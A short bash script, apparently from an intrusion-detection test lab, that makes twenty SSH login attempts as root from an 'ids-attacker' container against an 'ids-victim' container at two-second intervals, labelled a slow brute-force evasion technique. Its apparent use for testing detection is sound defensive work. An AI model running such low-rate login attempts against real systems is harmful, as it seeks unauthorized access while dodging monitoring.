#!/usr/bin/env bash
# Run a slow SSH brute force (evasion technique)
# Usage: bash lab/scripts/run_slow_brute.sh
set -euo pipefail
VICTIM_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ids-victim)"
echo "[+] Slow SSH brute force against ${VICTIM_IP} (2 sec intervals)"
for i in {1..20}; do
    docker exec ids-attacker ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@${VICTIM_IP} exit 2>/dev/null || true
    echo -n "."
    sleep 2
done
echo ""
